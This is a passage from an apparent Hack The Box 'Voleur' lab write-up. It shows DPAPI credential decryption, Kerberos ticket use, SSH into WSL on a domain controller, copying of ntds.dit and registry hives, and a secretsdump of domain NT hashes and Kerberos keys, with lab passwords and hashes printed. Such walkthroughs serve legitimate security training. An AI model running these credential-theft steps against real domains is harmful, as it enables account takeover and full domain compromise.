</span></span><span class=line><span class=cl>Version     :        <span class=m>2</span> <span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
</span></span><span class=line><span class=cl>Flags       :        <span class=m>0</span> <span class=o>(</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl>Policy      :        <span class=m>0</span> <span class=o>(</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl>MasterKeyLen: <span class=m>00000088</span> <span class=o>(</span>136<span class=o>)</span>
</span></span><span class=line><span class=cl>BackupKeyLen: <span class=m>00000068</span> <span class=o>(</span>104<span class=o>)</span>
</span></span><span class=line><span class=cl>CredHistLen : <span class=m>00000000</span> <span class=o>(</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl>DomainKeyLen: <span class=m>00000174</span> <span class=o>(</span>372<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Decrypted key with User Key <span class=o>(</span>MD4 protected<span class=o>)</span>
</span></span><span class=line><span class=cl>Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
</span></span></code></pre></td></tr></table></div></div><p>The DPAPI master key decryption process required the user&rsquo;s password (NightT1meP1dg3on14) and Security Identifier (SID).</p><p><strong>Master Key:</strong>¬†0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</p><p><strong>4.6 Credential Extraction</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>CREDENTIAL<span class=o>]</span>
</span></span><span class=line><span class=cl>LastWritten : 2025-01-29 12:55:19+00:00
</span></span><span class=line><span class=cl>Flags       : 0x00000030 <span class=o>(</span>CRED_FLAGS_REQUIRE_CONFIRMATION<span class=p>|</span>CRED_FLAGS_WILDCARD_MATCH<span class=o>)</span>
</span></span><span class=line><span class=cl>Persist     : 0x00000003 <span class=o>(</span>CRED_PERSIST_ENTERPRISE<span class=o>)</span>
</span></span><span class=line><span class=cl>Type        : 0x00000002 <span class=o>(</span>CRED_TYPE_DOMAIN_PASSWORD<span class=o>)</span>
</span></span><span class=line><span class=cl>Target      : Domain:target<span class=o>=</span>Jezzas_Account
</span></span><span class=line><span class=cl>Description : 
</span></span><span class=line><span class=cl>Unknown     : 
</span></span><span class=line><span class=cl>Username    : jeremy.combs
</span></span><span class=line><span class=cl>Unknown     : qT3V9pLXyN7W4m
</span></span></code></pre></td></tr></table></div></div><p>The credential extraction phase utilized the decrypted master key to recover stored Windows credentials. This attack vector highlights the risk of Windows&rsquo; credential caching mechanisms, which are designed for user convenience but can be exploited by attackers with appropriate access.</p><p><strong>Credentials Discovered:</strong></p><ul><li><strong>Username:</strong>¬†jeremy.combs</li><li><strong>Password:</strong>¬†qT3V9pLXyN7W4m</li><li><strong>Target:</strong>¬†Domain:target=Jezzas_Account</li></ul><p>The recovered credentials for jeremy.combs provided access to a higher-privileged user account, likely with access to additional resources and systems within the domain.</p><p><img alt="Jeremy Combs on BloodHound" loading=lazy src=/images/writeups/htb/voleur/jeremy_combs.png></p><hr><h2 id=phase-5-wslssh-access><strong>Phase 5: WSL/SSH Access</strong><a hidden class=anchor aria-hidden=true href=#phase-5-wslssh-access>#</a></h2><p><strong>5.1 Third-Line Support Access</strong></p><p>The escalation to jeremy.combs credentials provided access to the Third-Line Support folder, representing the highest tier of technical support within the organization. This folder contained sensitive administrative tools and documentation, including SSH private keys for system access.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Get TGT for jeremy.combs</span>
</span></span><span class=line><span class=cl>impacket-getTGT voleur.htb/jeremy.combs:qT3V9pLXyN7W4m
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>/home/hexhunter404/Downloads/jeremy.combs.ccache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> impacket-smbclient -k <span class=s1>&#39;voleur.htb/jeremy.combs@dc.voleur.htb&#39;</span> -no-pass             
</span></span><span class=line><span class=cl>2025-07-06 22:37:50.849882 <span class=o>(</span>+0200<span class=o>)</span> +28799.951925 +/- 0.012317 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28799.951925
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Type <span class=nb>help</span> <span class=k>for</span> list of commands
</span></span><span class=line><span class=cl><span class=c1># use IT</span>
</span></span><span class=line><span class=cl><span class=c1># cd Third-Line Support</span>
</span></span><span class=line><span class=cl><span class=c1># ls</span>
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Thu Jan <span class=m>30</span> 17:11:29 <span class=m>2025</span> .
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 10:10:01 <span class=m>2025</span> ..
</span></span><span class=line><span class=cl>-rw-rw-rw-       <span class=m>2602</span>  Thu Jan <span class=m>30</span> 17:11:29 <span class=m>2025</span> id_rsa
</span></span><span class=line><span class=cl>-rw-rw-rw-        <span class=m>186</span>  Thu Jan <span class=m>30</span> 17:07:35 <span class=m>2025</span> Note.txt.txt
</span></span><span class=line><span class=cl><span class=c1># get Note.txt.txt</span>
</span></span><span class=line><span class=cl><span class=c1># get id_rsa</span>
</span></span><span class=line><span class=cl><span class=c1># exit</span>
</span></span><span class=line><span class=cl>                                                                                                                                                                                                                                       
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# cat Note.txt.txt                                                       
</span></span><span class=line><span class=cl>Jeremy,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;ve had enough of Windows Backup! I&#39;</span>ve part configured WSL to see <span class=k>if</span> we can utilize any of the backup tools from Linux.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Please see what you can <span class=nb>set</span> up.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Thanks,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Admin
</span></span></code></pre></td></tr></table></div></div><p>But there‚Äôs still an interesting folder Backups that even jeremy.combs cannot access</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\I</span>T<span class=se>\T</span>hird-Line Support&gt; <span class=nb>cd</span> Backups
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\I</span>T<span class=se>\T</span>hird-Line Support<span class=se>\B</span>ackups&gt; dir
</span></span><span class=line><span class=cl>Access to the path <span class=s1>&#39;C:\IT\Third-Line Support\Backups&#39;</span> is denied.
</span></span><span class=line><span class=cl>At line:1 char:1
</span></span><span class=line><span class=cl>+ dir
</span></span><span class=line><span class=cl>+ ~~~
</span></span><span class=line><span class=cl>    + CategoryInfo          : PermissionDenied: <span class=o>(</span>C:<span class=se>\I</span>T<span class=se>\T</span>hird-Line Support<span class=se>\B</span>ackups:String<span class=o>)</span> <span class=o>[</span>Get-ChildItem<span class=o>]</span>, UnauthorizedAccessException
</span></span><span class=line><span class=cl>    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
</span></span></code></pre></td></tr></table></div></div><p><strong>5.2 SSH Key Analysis</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ssh-keygen -l -f id_rsa
</span></span><span class=line><span class=cl><span class=m>3072</span> SHA256:+SJo12eqmKss6G70Hv3/wPrD2rXK9QY7fg8uUrxUeUw svc_backup@DC <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl>                                                                                       
</span></span></code></pre></td></tr></table></div></div><p>The SSH key analysis revealed that the private key belonged to the svc_backup account on the domain controller. This discovery connected the unusual SSH service on port 2222 to the backup service account, suggesting a Linux subsystem used for backup operations.</p><p><strong>Key Identity:</strong>¬†svc_backup@DC (RSA)</p><p><strong>5.3 WSL Access</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>                                                                                                                                                   
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ssh -i id_rsa -p <span class=m>2222</span> svc_backup@10.129.196.199
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04 LTS <span class=o>(</span>GNU/Linux 4.4.0-20348-Microsoft x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Sun Jul  <span class=m>6</span> 13:41:33 PDT <span class=m>2025</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:    0.52      Processes:             <span class=m>9</span>
</span></span><span class=line><span class=cl>  Usage of /home: unknown   Users logged in:       <span class=m>0</span>
</span></span><span class=line><span class=cl>  Memory usage:   49%       IPv4 address <span class=k>for</span> eth0: 10.129.196.199
</span></span><span class=line><span class=cl>  Swap usage:     1%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>363</span> updates can be installed immediately.
</span></span><span class=line><span class=cl><span class=m>257</span> of these updates are security updates.
</span></span><span class=line><span class=cl>To see these additional updates run: apt list --upgradable
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Thu Jan <span class=m>30</span> 04:26:24 <span class=m>2025</span> from 127.0.0.1
</span></span><span class=line><span class=cl> * Starting OpenBSD Secure Shell server sshd                                                                                                                                                                                         <span class=o>[</span> OK <span class=o>]</span> 
</span></span><span class=line><span class=cl>svc_backup@DC:~$ <span class=nb>cd</span> /mnt/c/IT/Third-Line<span class=se>\ </span>Support/Backups
</span></span><span class=line><span class=cl>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ <span class=nb>cd</span> Active<span class=se>\ </span>Directory/
</span></span><span class=line><span class=cl>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>24592</span>
</span></span><span class=line><span class=cl>drwxrwxrwx <span class=m>1</span> svc_backup svc_backup     <span class=m>4096</span> Jan <span class=m>30</span> 03:49 .
</span></span><span class=line><span class=cl>drwxrwxrwx <span class=m>1</span> svc_backup svc_backup     <span class=m>4096</span> Jan <span class=m>30</span> 08:11 ..
</span></span><span class=line><span class=cl>-rwxrwxrwx <span class=m>1</span> svc_backup svc_backup <span class=m>25165824</span> Jan <span class=m>30</span> 03:49 ntds.dit
</span></span><span class=line><span class=cl>-rwxrwxrwx <span class=m>1</span> svc_backup svc_backup    <span class=m>16384</span> Jan <span class=m>30</span> 03:49 ntds.jfm
</span></span><span class=line><span class=cl>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ file ntds.dit 
</span></span><span class=line><span class=cl>ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0x34ab375f, page size 8192, Windows version 10.0
</span></span><span class=line><span class=cl>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ <span class=nb>cd</span> registry/
</span></span><span class=line><span class=cl>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>17952</span>
</span></span><span class=line><span class=cl>drwxrwxrwx <span class=m>1</span> svc_backup svc_backup     <span class=m>4096</span> Jan <span class=m>30</span> 03:49 .
</span></span><span class=line><span class=cl>drwxrwxrwx <span class=m>1</span> svc_backup svc_backup     <span class=m>4096</span> Jan <span class=m>30</span> 08:11 ..
</span></span><span class=line><span class=cl>-rwxrwxrwx <span class=m>1</span> svc_backup svc_backup    <span class=m>32768</span> Jan <span class=m>30</span> 03:30 SECURITY
</span></span><span class=line><span class=cl>-rwxrwxrwx <span class=m>1</span> svc_backup svc_backup <span class=m>18350080</span> Jan <span class=m>30</span> 03:30 SYSTEM
</span></span><span class=line><span class=cl>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ file SECURITY
</span></span><span class=line><span class=cl>SECURITY: MS Windows registry file, NT/2000 or above
</span></span><span class=line><span class=cl>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ file SYSTEM
</span></span><span class=line><span class=cl>SYSTEM: MS Windows registry file, NT/2000 or above
</span></span></code></pre></td></tr></table></div></div><p>The successful SSH connection confirmed the presence of Windows Subsystem for Linux (WSL) on the domain controller. This configuration allowed Linux-based tools and scripts to run on the Windows system, providing additional administrative capabilities but also creating new attack vectors.</p><p><strong>WSL Environment:</strong>¬†Ubuntu 20.04 LTS on Windows</p><p>The WSL environment provided access to the Windows file system through the¬†<code>/mnt/c/</code>¬†mount point. The backup folder contained critical system files that would normally be inaccessible to standard users, representing a significant security exposure.</p><p><strong>Critical Backups Found:</strong></p><ul><li><strong>Active Directory/</strong>¬†(ntds.dit, ntds.jfm)</li><li><strong>registry/</strong>¬†(SYSTEM, SECURITY)</li></ul><p>The discovery of Active Directory database files (ntds.dit) and registry hives (SYSTEM, SECURITY) represented the most critical finding of the entire penetration test. These files contain all domain user password hashes and system secrets.</p><p><strong>6.2 File Transfer</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# scp -P <span class=m>2222</span> -i id_rsa svc_backup@10.129.196.199:<span class=s2>&#34;/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit&#34;</span> .
</span></span><span class=line><span class=cl>ntds.dit                           100%   24MB   2.5MB/s   00:09                                 
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# scp -P <span class=m>2222</span> -i id_rsa svc_backup@10.129.196.199:<span class=s2>&#34;/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY&#34;</span> .        
</span></span><span class=line><span class=cl>SECURITY                           100%   32KB 189.5KB/s   00:00    
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# scp -P <span class=m>2222</span> -i id_rsa svc_backup@10.129.196.199:<span class=s2>&#34;/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM&#34;</span> .  
</span></span><span class=line><span class=cl>SYSTEM                             100%   18MB   3.0MB/s   00:05    
</span></span></code></pre></td></tr></table></div></div><p>The file transfer operation utilized SCP (Secure Copy Protocol) to extract the critical backup files. The ability to access these files through the WSL environment bypassed normal Windows security controls and audit mechanisms.</p><p><strong>6.3 Domain Hash Extraction</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping cached domain logon information <span class=o>(</span>domain/username:hash<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping LSA Secrets
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=nv>$MACHINE</span>.ACC 
</span></span><span class=line><span class=cl><span class=nv>$MACHINE</span>.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
</span></span><span class=line><span class=cl><span class=nv>$MACHINE</span>.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> DPAPI_SYSTEM 
</span></span><span class=line><span class=cl>dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
</span></span><span class=line><span class=cl>dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NL<span class=nv>$KM</span> 
</span></span><span class=line><span class=cl> <span class=m>0000</span>   <span class=m>06</span> 6A DC 3B AE F7 <span class=m>34</span> <span class=m>91</span>  <span class=m>73</span> 0F 6C E0 <span class=m>55</span> FE A3 FF   .j.<span class=p>;</span>..4.s.l.U...
</span></span><span class=line><span class=cl> <span class=m>0010</span>   <span class=m>30</span> <span class=m>31</span> <span class=m>90</span> 0A E7 C6 <span class=m>12</span> <span class=m>01</span>  <span class=m>08</span> 5A D0 1E A5 BB D2 <span class=m>37</span>   01.......Z.....7
</span></span><span class=line><span class=cl> <span class=m>0020</span>   <span class=m>61</span> C3 FA 0D AF C9 <span class=m>94</span> 4A  <span class=m>01</span> <span class=m>75</span> <span class=m>53</span> <span class=m>04</span> <span class=m>46</span> <span class=m>66</span> 0A AC   a......J.uS.Ff..
</span></span><span class=line><span class=cl> <span class=m>0030</span>   D8 <span class=m>99</span> 1F D3 BE <span class=m>53</span> 0C CF  6E 2A 4E <span class=m>74</span> F2 E9 F2 EB   .....S..n*Nt....
</span></span><span class=line><span class=cl>NL<span class=nv>$KM</span>:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping Domain Credentials <span class=o>(</span>domain<span class=se>\u</span>id:rid:lmhash:nthash<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Searching <span class=k>for</span> pekList, be patient
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> PEK <span class=c1># 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Reading and decrypting hashes from ntds.dit 
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
</span></span><span class=line><span class=cl>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\r</span>yan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\m</span>arie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\l</span>acey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\j</span>eremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Kerberos keys from ntds.dit 
</span></span><span class=line><span class=cl>Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
</span></span><span class=line><span class=cl>Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
</span></span><span class=line><span class=cl>Administrator:des-cbc-md5:459d836b9edcd6b0
</span></span><span class=line><span class=cl>DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
</span></span><span class=line><span class=cl>DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
</span></span><span class=line><span class=cl>DC$:des-cbc-md5:64e05b6d1abff1c8
</span></span><span class=line><span class=cl>krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
</span></span><span class=line><span class=cl>krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
